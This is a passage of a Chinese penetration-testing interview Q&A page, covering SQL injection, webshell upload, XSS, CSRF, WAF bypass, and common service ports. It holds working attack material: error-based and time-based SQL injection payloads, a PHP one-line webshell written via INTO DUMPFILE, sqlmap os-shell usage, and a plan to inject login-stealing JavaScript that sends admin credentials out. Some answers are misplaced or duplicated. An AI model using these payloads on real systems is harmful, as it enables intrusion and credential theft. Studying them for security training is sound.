id="17-某服务器有站点-A-B-为何在-A-的后台添加-test-⽤户，访问-B-的后台。发现也添加上了-test-⽤户？"><a href="#17-某服务器有站点-A-B-为何在-A-的后台添加-test-⽤户，访问-B-的后台。发现也添加上了-test-⽤户？" class="headerlink" title="17. 某服务器有站点 A,B 为何在 A 的后台添加 test ⽤户，访问 B 的后台。发现也添加上了 test ⽤户？"></a>17. 某服务器有站点 A,B 为何在 A 的后台添加 test ⽤户，访问 B 的后台。发现也添加上了 test ⽤户？</h4><p>同数据库。 </p><h4 id="18-注⼊时可以不使⽤-and-或-or-或-xor，直接-order-by-开始注⼊吗？"><a href="#18-注⼊时可以不使⽤-and-或-or-或-xor，直接-order-by-开始注⼊吗？" class="headerlink" title="18. 注⼊时可以不使⽤ and 或 or 或 xor，直接 order by 开始注⼊吗？"></a>18. 注⼊时可以不使⽤ and 或 or 或 xor，直接 order by 开始注⼊吗？</h4><p>and/or/xor，前⾯的 1=1、1=2 步骤只是为了判断是否为注⼊点，如果已经确定是注⼊点那就可以省那步骤去。 </p><h4 id="19-某个防注⼊系统，在注⼊时会提示："><a href="#19-某个防注⼊系统，在注⼊时会提示：" class="headerlink" title="19: 某个防注⼊系统，在注⼊时会提示："></a>19: 某个防注⼊系统，在注⼊时会提示：</h4><p>系统检测到你有⾮法注⼊的⾏为。 </p><p>已记录您的 ip xx.xx.xx.xx </p><p>时间: 2016:01-23 </p><p>提交⻚⾯: test.asp?id=15 </p><p>提交内容: and 1=1 </p><h4 id="20、如何利⽤这个防注⼊系统拿-shell？"><a href="#20、如何利⽤这个防注⼊系统拿-shell？" class="headerlink" title="20、如何利⽤这个防注⼊系统拿 shell？"></a>20、如何利⽤这个防注⼊系统拿 shell？</h4><p>在 URL ⾥⾯直接提交⼀句话，这样⽹站就把你的⼀句话也记录进数据库⽂件了 这个时候可以尝试寻找⽹站的配置⽂件 </p><p>直接上菜⼑链接。 </p><h4 id="21-上传⼤⻢后访问乱码时，有哪些解决办法？"><a href="#21-上传⼤⻢后访问乱码时，有哪些解决办法？" class="headerlink" title="21. 上传⼤⻢后访问乱码时，有哪些解决办法？"></a>21. 上传⼤⻢后访问乱码时，有哪些解决办法？</h4><p>浏览器中改编码。 </p><h4 id="22-审查上传点的元素有什么意义？"><a href="#22-审查上传点的元素有什么意义？" class="headerlink" title="22. 审查上传点的元素有什么意义？"></a>22. 审查上传点的元素有什么意义？</h4><p>有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 </p><h4 id="23-⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示："><a href="#23-⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示：" class="headerlink" title="23. ⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示："></a>23. ⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示：</h4><p>“</p><p>此⽤户不存在</p><p>”</p><p>，你觉得这⾥怎样利⽤？先爆破⽤户名，再利⽤被爆破出来的⽤户名爆破密码。 </p><p>其实有些站点，在登陆处也会这样提示 </p><p>所有和数据库有交互的地⽅都有可能有注⼊。 </p><h4 id="24-⽬标站发现某-txt-的下载地址为"><a href="#24-⽬标站发现某-txt-的下载地址为" class="headerlink" title="24. ⽬标站发现某 txt 的下载地址为"></a>24. ⽬标站发现某 txt 的下载地址为</h4><p><a href="http://www.test.com/down/down.php?fifile=/upwdown/1.txt，你有什么思路？">http://www.test.com/down/down.php?fifile=/upwdown/1.txt，你有什么思路？</a> </p><p>这就是传说中的下载漏洞！在 fifile = 后⾯尝试输⼊ index.php 下载他的⾸⻚⽂件，然后在⾸⻚⽂件⾥继续查找其他⽹站 </p><p>的配置⽂件，可以找出⽹站的数据库密码和数据库的地址。 </p><h4 id="25-甲给你⼀个⽬标站，并且告诉你根⽬录下存在-abc-⽬录，并且此⽬录下存在编辑器和-admin-⽬录。请问你的想"><a href="#25-甲给你⼀个⽬标站，并且告诉你根⽬录下存在-abc-⽬录，并且此⽬录下存在编辑器和-admin-⽬录。请问你的想" class="headerlink" title="25. 甲给你⼀个⽬标站，并且告诉你根⽬录下存在 / abc / ⽬录，并且此⽬录下存在编辑器和 admin ⽬录。请问你的想"></a>25. 甲给你⼀个⽬标站，并且告诉你根⽬录下存在 / abc / ⽬录，并且此⽬录下存在编辑器和 admin ⽬录。请问你的想</h4><p>法是？ </p><p>直接在⽹站⼆级⽬录 / abc / 下扫描敏感⽂件及⽬录。 </p><h4 id="26-在有-shell-的情况下，如何使⽤-xss-实现对⽬标站的⻓久控制？"><a href="#26-在有-shell-的情况下，如何使⽤-xss-实现对⽬标站的⻓久控制？" class="headerlink" title="26. 在有 shell 的情况下，如何使⽤ xss 实现对⽬标站的⻓久控制？"></a>26. 在有 shell 的情况下，如何使⽤ xss 实现对⽬标站的⻓久控制？</h4><p>后台登录处加⼀段记录登录账号密码的 js，并且判断是否登录成功，如果登录成功，就把账号密码记录到⼀个⽣僻的路 </p><p>径的⽂件中或者直接发到⾃⼰的⽹站⽂件中。(此⽅法适合有价值并且需要深⼊控制权限的⽹络)。 </p><p>在登录后才可以访问的⽂件中插⼊ XSS 脚本。 </p><h4 id="27-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个⽤户的密码？"><a href="#27-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个⽤户的密码？" class="headerlink" title="27. 后台修改管理员密码处，原密码显示为 *。你觉得该怎样实现读出这个⽤户的密码？"></a>27. 后台修改管理员密码处，原密码显示为 *。你觉得该怎样实现读出这个⽤户的密码？</h4><p>审查元素 把密码处的 password 属性改成 text 就明⽂显示了 </p><h4 id="28-⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则-403-什么原因？"><a href="#28-⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则-403-什么原因？" class="headerlink" title="28. ⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则 403. 什么原因？"></a>28. ⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则 403. 什么原因？</h4><p>原因很多，有可能 web 服务器配置把上传⽬录写死了不执⾏相应脚本，尝试改后缀名绕过 </p><h4 id="29-审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？"><a href="#29-审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？" class="headerlink" title="29. 审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？"></a>29. 审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？</h4><p>在敏感操作被拦截，通过界⾯信息⽆法具体判断是什么防护的时候，F12 看 HTML 体部 ⽐如护卫神就可以在名称那看到内容。 </p><h4 id="30-在-win2003-服务器中建⽴⼀个-zhongzi-⽂件夹⽤意何为？"><a href="#30-在-win2003-服务器中建⽴⼀个-zhongzi-⽂件夹⽤意何为？" class="headerlink" title="30. 在 win2003 服务器中建⽴⼀个 .zhongzi ⽂件夹⽤意何为？"></a>30. 在 win2003 服务器中建⽴⼀个 .zhongzi ⽂件夹⽤意何为？</h4><p>隐藏⽂件夹，为了不让管理员发现你传上去的⼯具。 </p><h4 id="31、sql-注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由："><a href="#31、sql-注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由：" class="headerlink" title="31、sql 注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由："></a>31、sql 注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由：</h4><p>A. demo.jsp?id=2+1 </p><p>B. demo.jsp?id=2-1 </p><p>选 B，在 URL 编码中 + 代表空格，可能会造成混淆</p><h4 id="32、以下链接存在-sql-注⼊漏洞，对于这个变形注⼊，你有什么思路？"><a href="#32、以下链接存在-sql-注⼊漏洞，对于这个变形注⼊，你有什么思路？" class="headerlink" title="32、以下链接存在 sql 注⼊漏洞，对于这个变形注⼊，你有什么思路？"></a>32、以下链接存在 sql 注⼊漏洞，对于这个变形注⼊，你有什么思路？</h4><p>demo.do?DATA=AjAxNg== </p><p>DATA 有可能经过了 base64 编码再传⼊服务器，所以我们也要对参数进⾏ base64 编码才能正确完成测试 </p><h4 id="33、发现-demo-jsp-uid-110-注⼊点，你有哪⼏种思路获取-webshell，哪种是优选？"><a href="#33、发现-demo-jsp-uid-110-注⼊点，你有哪⼏种思路获取-webshell，哪种是优选？" class="headerlink" title="33、发现 demo.jsp?uid=110 注⼊点，你有哪⼏种思路获取 webshell，哪种是优选？"></a>33、发现 demo.jsp?uid=110 注⼊点，你有哪⼏种思路获取 webshell，哪种是优选？</h4><p>有写⼊权限的，构造联合查询语句使⽤ using INTO OUTFILE，可以将查询的输出重定向到系统的⽂件中，这样去写⼊</p><p>WebShell 使⽤ sqlmap –os-shell 原理和上⾯⼀种相同，来直接获得⼀个 Shell，这样效率更⾼ 通过构造联合查询语句 </p><p>得到⽹站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等⽅法上传 Shell </p><h4 id="34、CSRF-和-XSS-和-XXE-有什么区别，以及修复⽅式？"><a href="#34、CSRF-和-XSS-和-XXE-有什么区别，以及修复⽅式？" class="headerlink" title="34、CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？"></a>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？</h4><p>XSS 是跨站脚本攻击，⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。修复⽅式：对字符实体 </p><p>进⾏转义、使⽤ HTTP Only 来禁⽌ JavaScript 读取 Cookie 值、输⼊时校验、浏览器与 Web 应⽤端采⽤相同的字符编 </p><p>码。</p><p>CSRF 是跨站请求伪造攻击，XSS 是实现 CSRF 的诸多⼿段中的⼀种，是由于没有在关键操作执⾏时进⾏是否由⽤户⾃ </p><p>愿发起的确认。修复⽅式：筛选出需要防范 CSRF 的⻚⾯然后嵌⼊ Token、再次输⼊密码、检验 Referer XXE 是 XML </p><p>外部实体注⼊攻击，XML 中可以通过调⽤实体来请求本地或者远程内容，和远程⽂件保护类似，会引发相关安全问题，例如敏感⽂件读取。修复⽅式：XML 解析库在调⽤时严格禁⽌对外部实体的解析。 </p><h4 id="35、CSRF、SSRF-和重放攻击有什么区别？"><a href="#35、CSRF、SSRF-和重放攻击有什么区别？" class="headerlink" title="35、CSRF、SSRF 和重放攻击有什么区别？"></a>35、CSRF、SSRF 和重放攻击有什么区别？</h4><p>CSRF 是跨站请求伪造攻击，由客户端发起 SSRF 是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进⾏ </p><p>重放，达到身份认证等⽬的</p><h4 id="36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？"><a href="#36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？" class="headerlink" title="36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？"></a>36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？</h4><p>密码找回漏洞中存在 </p><p>1）密码允许暴⼒破解、 </p><p>2）存在通⽤型找回凭证、 </p><p>3）可以跳过验证步骤、 </p><p>4）找回凭证可以拦包获取 </p><p>等⽅式来通过⼚商提供的密码找回功能来得到密码。身份认证漏洞中最常⻅的是 </p><p>1）会话固定攻击 </p><p>2） Cookie 仿冒 </p><p>只要得到 Session 或 Cookie 即可伪造⽤户身份。验证码漏洞中存在 </p><p>1）验证码允许暴⼒破解 </p><p>2）验证码可以通过 Javascript 或者改包的⽅法来进⾏绕过 </p><h4 id="37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？"><a href="#37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？" class="headerlink" title="37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？"></a>37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？</h4><p>get /ecskins/demo jsp?uid=2016031900&amp;keyword=”hello world”get /ecskins/demo.jsp?uid=2016031900&amp;keyword= hello world</p><p>HTTP/1.1Host:***.com:82User-Agent:Mozilla/</p><p>5.0 Firefox/40Accept:text/css,/;q=0.1</p><p>Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3</p><p>Referer:http://<strong>***</strong>.com/eciop/orderForCC/</p><p>cgtListForCC.htm?zone=11370601&amp;v=145902</p><p>Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;</p><p>uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;</p><p>st_uid=N90PLYHLZGJXI-NX01VPUF46W;</p><p>status=True</p><p>Connection:keep-alive</p><p>有写⼊权限的，构造联合查询语句使⽤ using INTO OUTFILE，可以将查询的输出重定向到系统的⽂件中，这样去写⼊</p><p>WebShell 使⽤ sqlmap –os-shell 原理和上⾯⼀种相同，来直接获得⼀个 Shell，这样效率更⾼ 通过构造联合查询语句 </p><p>得到⽹站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等⽅法上传 Shell </p><h4 id="38、给你⼀个⽹站你是如何来渗透测试的-在获取书⾯授权的前提下。"><a href="#38、给你⼀个⽹站你是如何来渗透测试的-在获取书⾯授权的前提下。" class="headerlink" title="38、给你⼀个⽹站你是如何来渗透测试的? 在获取书⾯授权的前提下。"></a>38、给你⼀个⽹站你是如何来渗透测试的? 在获取书⾯授权的前提下。</h4><h4 id="39、sqlmap，怎么对⼀个注⼊点注⼊？"><a href="#39、sqlmap，怎么对⼀个注⼊点注⼊？" class="headerlink" title="39、sqlmap，怎么对⼀个注⼊点注⼊？"></a>39、sqlmap，怎么对⼀个注⼊点注⼊？</h4><p>1）如果是 get 型号，直接，sqlmap -u “诸如点⽹址”. </p><p>2) 如果是 post 型诸如点，可以 sqlmap -u “注⼊点⽹址” –data=”post 的参数 “ </p><p>3）如果是 cookie，X-Forwarded-For 等，可以访问的时候，⽤ burpsuite 抓包，注⼊处⽤号替换，放到⽂件⾥，然后 </p><p>sqlmap -r “⽂件地址” </p><h4 id="40、nmap，扫描的⼏种⽅式"><a href="#40、nmap，扫描的⼏种⽅式" class="headerlink" title="40、nmap，扫描的⼏种⽅式"></a>40、nmap，扫描的⼏种⽅式</h4><h4 id="41、sql-注⼊的⼏种类型？"><a href="#41、sql-注⼊的⼏种类型？" class="headerlink" title="41、sql 注⼊的⼏种类型？"></a>41、sql 注⼊的⼏种类型？</h4><p>1）报错注⼊ </p><p>2）bool 型注⼊ </p><p>3）延时注⼊ </p><p>4）宽字节注⼊ </p><h4 id="42、报错注⼊的函数有哪些？10-个"><a href="#42、报错注⼊的函数有哪些？10-个" class="headerlink" title="42、报错注⼊的函数有哪些？10 个"></a>42、报错注⼊的函数有哪些？10 个</h4><p>1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】</p><p>2）通过floor报错 向下取整3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1) </p><p>4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)</p><p>b));</p><p>5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));</p><p>6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));</p><p>7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));</p><p>8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));</p><p>9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));</p><p>10）.exp()select from test where id=1 and exp(~(select * from(select user())a));</p><h4 id="43、延时注⼊如何来判断？"><a href="#43、延时注⼊如何来判断？" class="headerlink" title="43、延时注⼊如何来判断？"></a>43、延时注⼊如何来判断？</h4><p>if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1) </p><h4 id="44、盲注和延时注⼊的共同点？"><a href="#44、盲注和延时注⼊的共同点？" class="headerlink" title="44、盲注和延时注⼊的共同点？"></a>44、盲注和延时注⼊的共同点？</h4><p>都是⼀个字符⼀个字符的判断 </p><h4 id="45、如何拿⼀个⽹站的-webshell？上传，后台编辑模板，sql-注⼊写⽂件，命令执⾏，代码执⾏，-⼀些已经爆出的-cms"><a href="#45、如何拿⼀个⽹站的-webshell？上传，后台编辑模板，sql-注⼊写⽂件，命令执⾏，代码执⾏，-⼀些已经爆出的-cms" class="headerlink" title="45、如何拿⼀个⽹站的 webshell？上传，后台编辑模板，sql 注⼊写⽂件，命令执⾏，代码执⾏， ⼀些已经爆出的 cms"></a>45、如何拿⼀个⽹站的 webshell？上传，后台编辑模板，sql 注⼊写⽂件，命令执⾏，代码执⾏， ⼀些已经爆出的 cms</h4><p>漏洞，⽐如 dedecms 后台可以直接建⽴脚本⽂件，wordpress 上传插件包含脚本⽂件 zip 压缩包等 </p><h4 id="46、sql-注⼊写⽂件都有哪些函数？"><a href="#46、sql-注⼊写⽂件都有哪些函数？" class="headerlink" title="46、sql 注⼊写⽂件都有哪些函数？"></a>46、sql 注⼊写⽂件都有哪些函数？</h4><p>select ‘⼀句话’ into outfile ‘路径’</p><p>select ‘⼀句话’ into dumpfile ‘路径’</p><p>select ‘<?php eval($_POST[1]) ?>‘ into dumpfile ‘d:\wwwroot\baidu.com\nvhack.php’; </p><h4 id="47、如何防⽌-CSRF"><a href="#47、如何防⽌-CSRF" class="headerlink" title="47、如何防⽌ CSRF?"></a>47、如何防⽌ CSRF?</h4><p>1）验证 referer </p><p>2）验证 token </p><p>详细：<a href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a> </p><h4 id="48、owasp-漏洞都有哪些？"><a href="#48、owasp-漏洞都有哪些？" class="headerlink" title="48、owasp 漏洞都有哪些？"></a>48、owasp 漏洞都有哪些？</h4><p>1）SQL 注⼊防护⽅法： </p><p>2）失效的身份认证和会话管理2）失效的身份认证和会话管理 </p><p>3）跨站脚本攻击 XSS </p><p>4）直接引⽤不安全的对象 </p><p>5）安全配置错误 </p><p>6）敏感信息泄露 </p><p>7）缺少功能级的访问控制 </p><p>8）跨站请求伪造 CSRF </p><p>9）使⽤含有已知漏洞的组件 </p><p>10）未验证的重定向和转发 </p><h4 id="49、SQL-注⼊防护⽅法？"><a href="#49、SQL-注⼊防护⽅法？" class="headerlink" title="49、SQL 注⼊防护⽅法？"></a>49、SQL 注⼊防护⽅法？</h4><p>1）使⽤安全的 API </p><p>2）对输⼊的特殊字符进⾏ Escape 转义处理 </p><p>3）使⽤⽩名单来规范化输⼊验证⽅法 </p><p>4）对客户端输⼊进⾏控制，不允许输⼊ SQL 注⼊相关的特殊字符 </p><p>5）服务器端在提交数据库进⾏ SQL 查询之前，对特殊字符进⾏过滤、转义、替换、删除。 </p><h4 id="50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？"><a href="#50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？" class="headerlink" title="50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？"></a>50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？</h4><p>1）代码执⾏：</p><p>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</p><p>2）⽂件读取：</p><p>file_get_contents(),highlight_file(),fopen(),read</p><p>file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</p><p>3)命令执⾏：</p><p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p><h4 id="51、img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？"><a href="#51、img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？" class="headerlink" title="51、img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？"></a>51、img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？</h4><p>src 指定⼀个远程的脚本⽂件，获取 referer52、img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以. jpg 结尾，怎么获取管理员路径。 </p><p>1）远程服务器修改 apache 配置⽂件，配置. jpg ⽂件以 php ⽅式来解析 AddType application/x-httpd-php .jpg &lt;img </p><p>src=<a href="http://xss.tv/1.jpg&gt;">http://xss.tv/1.jpg&gt;</a> 会以 php ⽅式来解析 </p><h4 id="53、为什么-aspx-⽊⻢权限⽐-asp-⼤？"><a href="#53、为什么-aspx-⽊⻢权限⽐-asp-⼤？" class="headerlink" title="53、为什么 aspx ⽊⻢权限⽐ asp ⼤？"></a>53、为什么 aspx ⽊⻢权限⽐ asp ⼤？</h4><p>aspx 使⽤的是. net 技术。IIS 中默认不⽀持，ASP 只是脚本语⾔⽽已。⼊侵的时候 asp 的⽊⻢⼀般是 guest 权限… </p><p>APSX 的⽊⻢⼀般是 users 权限。 </p><h4 id="54、如何绕过-waf？"><a href="#54、如何绕过-waf？" class="headerlink" title="54、如何绕过 waf？"></a>54、如何绕过 waf？</h4><p>⼤⼩写转换法 </p><p>⼲扰字符 /<em>!</em>/</p><p>编码 base64 unicode hex url ascll </p><p>复参数 </p><h4 id="55、如何向服务器写⼊-webshell？"><a href="#55、如何向服务器写⼊-webshell？" class="headerlink" title="55、如何向服务器写⼊ webshell？"></a>55、如何向服务器写⼊ webshell？</h4><p>各种上传漏洞</p><p>mysql具有写⼊权限,⽤sql语句写⼊shell</p><p>http put⽅法 </p><h4 id="56、渗透测试中常⻅的端⼝"><a href="#56、渗透测试中常⻅的端⼝" class="headerlink" title="56、渗透测试中常⻅的端⼝"></a>56、渗透测试中常⻅的端⼝</h4><p>a、web 类 (web 漏洞 / 敏感⽬录) 第三⽅通⽤组件漏洞 struts thinkphp jboss ganglia zabbix</p><p>80 web </p><p>80-89 web </p><p>8000-9090 web</p><p>b、数据库类 (扫描弱⼝令)1433 MSSQL </p><p>1521 Oracle </p><p>3306 MySQL </p><p>5432 PostgreSQL</p><p>c、特殊服务类 (未授权 / 命令执⾏类 / 漏洞)</p><p>443 SSL⼼脏滴⾎</p><p>873 Rsync未授权</p><p>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a> </p><p>6379 redis未授权</p><p>7001,7002 WebLogic默认弱⼝令，反序列</p><p>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞</p><p>11211 memcache未授权访问</p><p>27017,27018 Mongodb未授权访问</p><p>50000 SAP命令执⾏</p><p>50070,50030 hadoop默认端⼝未授权访问 </p><p>d、常⽤端⼝类 (扫描弱⼝令 / 端⼝爆破)</p><p>21 ftp </p><p>22 SSH </p><p>23 Telnet </p><p>2601,2604 zebra路由，默认密码zebra</p><p>3389 远程桌⾯ </p><h5 id="ALL、端⼝合计详情"><a href="#ALL、端⼝合计详情" class="headerlink" title="ALL、端⼝合计详情"></a>ALL、端⼝合计详情</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">21 ftp </span><br><span class="line"></span><br><span class="line">22 SSH </span><br><span class="line"></span><br><span class="line">23 Telnet </span><br><span class="line"></span><br><span class="line">80 web </span><br><span class="line"></span><br><span class="line">80-89 web </span><br><span class="line"></span><br><span class="line">161 SNMP </span><br><span class="line"></span><br><span class="line">389 LDAP </span><br><span class="line"></span><br><span class="line">443 SSL⼼脏滴⾎以及⼀些web漏洞测试</span><br><span class="line"></span><br><span class="line">445 SMB 512,513,514 Rexec </span><br><span class="line"></span><br><span class="line">873 Rsync未授权</span><br><span class="line"></span><br><span class="line">1025,111 NFS </span><br><span class="line"></span><br><span class="line">1433 MSSQL </span><br><span class="line"></span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line"></span><br><span class="line">2082&#x2F;2083 cpanel主机管理系统登陆 （国外⽤较多）</span><br><span class="line"></span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外⽤较多）</span><br><span class="line"></span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line"></span><br><span class="line">3128 squid代理默认端⼝，如果没设置⼝令很可能就直接漫游内⽹了</span><br><span class="line"></span><br><span class="line">3306 MySQL </span><br><span class="line"></span><br><span class="line">3312&#x2F;3311 kangle主机管理系统登陆</span><br><span class="line"></span><br><span class="line">3389 远程桌⾯</span><br><span class="line"></span><br><span class="line">4440 rundeck 参考WooYun: 借⽤新浪某服务成功漫游新浪内⽹</span><br><span class="line"></span><br><span class="line">5432 PostgreSQL </span><br><span class="line"></span><br><span class="line">5900 vnc </span><br><span class="line"></span><br><span class="line">5984 CouchDB http:&#x2F;&#x2F;xxx:5984&#x2F;_utils&#x2F; </span><br><span class="line"></span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致⽹站被直接篡改或者作为代理进⼊内⽹</span><br><span class="line"></span><br><span class="line">6379 redis未授权</span><br><span class="line"></span><br><span class="line">7001,7002 WebLogic默认弱⼝令，反序列</span><br><span class="line"></span><br><span class="line">7778 Kloxo主机控制⾯板登录</span><br><span class="line"></span><br><span class="line">8000-9090 都是⼀些常⻅的web端⼝，有些运维喜欢把管理后台开在这些⾮80的端⼝上</span><br><span class="line"></span><br><span class="line">8080 tomcat&#x2F;WDCP主机管理系统，默认弱⼝令</span><br><span class="line"></span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line"></span><br><span class="line">8083 Vestacp主机管理系统 （国外⽤较多）</span><br><span class="line"></span><br><span class="line">8649 ganglia </span><br><span class="line"></span><br><span class="line">8888 amh&#x2F;LuManager 主机管理系统默认端⼝</span><br><span class="line"></span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞</span><br><span class="line"></span><br><span class="line">10000 Virtualmin&#x2F;Webmin 服务器虚拟主机管理系统</span><br><span class="line"></span><br><span class="line">11211 memcache未授权访问</span><br><span class="line"></span><br><span class="line">27017,27018 Mongodb未授权访问</span><br><span class="line"></span><br><span class="line">28017 mongodb统计⻚⾯</span><br><span class="line"></span><br><span class="line">50000 SAP命令执⾏</span><br><span class="line"></span><br><span class="line">50070,50030 hadoop默认端⼝未授权访问 </span><br></pre></td></tr></table></figure><h3 id="三、深信服⼀⾯"><a href="#三、深信服⼀⾯" class="headerlink" title="三、深信服⼀⾯"></a>三、深信服⼀⾯</h3><p>了解哪些漏洞⽂件上传有哪些防护⽅式 </p><p>⽤什么扫描端⼝，⽬录 </p><p>如何判断注⼊ </p><p>注⼊有防护怎么办 </p><p>有没有写过 tamper </p><p>3306 1443 8080 是什么端⼝ </p><p>计算机⽹络从物理层到应⽤层 xxxx </p><p>有没有 web 服务开发经验 </p><p>如何向服务器写⼊ webshell </p><p>有没有⽤过 xss 平台 </p><p>⽹站渗透的流程 </p><p>mysql 两种提权⽅式（udf，？）</p><p>常⻅加密⽅式 xxx </p><p>ddos 如何防护 </p><p>有没有抓过包，会不会写 wireshark 过滤规则 </p><p>清理⽇志要清理哪些 </p><h4 id="四、SQL-注⼊防护"><a href="#四、SQL-注⼊防护" class="headerlink" title="四、SQL 注⼊防护"></a>四、SQL 注⼊防护</h4><p>1、使⽤安全的 API </p><p>2、对输⼊的特殊字符进⾏ Escape 转义处理 </p><p>3、使⽤⽩名单来规范化输⼊验证⽅法 </p><p>4、对客户端输⼊进⾏控制，不允许输⼊ SQL 注⼊相关的特殊字符 </p><p>5、服务器端在提交数据库进⾏ SQL 查询之前，对特殊字符进⾏过滤、转义、替换、删除。 </p><p>6、规范编码, 字符集 </p><h4 id="五、为什么参数化查询可以防⽌-SQL-注⼊"><a href="#五、为什么参数化查询可以防⽌-SQL-注⼊" class="headerlink" title="五、为什么参数化查询可以防⽌ SQL 注⼊"></a>五、为什么参数化查询可以防⽌ SQL 注⼊</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h5><p>使⽤参数化查询数据库服务器不会把参数的内容当作 sql 指令的⼀部分来执⾏，是在数据库完成 sql 指令的编译后才套 </p><p>⽤参数运⾏ </p><p>简单的说: 参数化能防注⼊的原因在于, 语句是语句，参数是参数，参数的值并不是语句的⼀部分，数据库只按语句的语 义跑</p><h4 id="六、SQL-头注⼊点"><a href="#六、SQL-头注⼊点" class="headerlink" title="六、SQL 头注⼊点"></a>六、SQL 